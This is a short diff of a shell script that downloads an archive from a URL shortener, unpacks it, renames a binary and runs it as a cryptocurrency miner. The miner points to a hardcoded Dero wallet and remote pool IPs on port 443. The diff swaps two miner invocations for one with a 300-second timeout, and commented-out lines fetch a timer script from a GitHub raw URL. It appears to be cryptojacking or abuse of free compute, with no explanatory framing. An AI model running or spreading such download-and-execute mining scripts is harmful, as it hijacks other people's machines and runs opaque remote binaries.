@@ -11,8 +11,7 @@
 wget -qO aduls.tar.xz https://cutt.ly/vBXC1AM
 tar xf aduls.tar.xz
 mv uranus unus
-./unus -u dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9pxq5qgalafqu -o tcp://52.86.135.71:443 || echo done
-timeout 300 ./jigsaw -w dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9pxq5qgalafqu -r 148.113.142.107:443 -p stratum
+timeout 300 ./unus -u dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9pxq5qgalafqu -o tcp://52.86.135.71:443 || echo done
 #wget -qO timer https://raw.githubusercontent.com/amit12986/SC/main/timer.sh
 #chmod 700 timer
 #timeout 320 ./timer || echo "Udah, Cape pengen beli tape
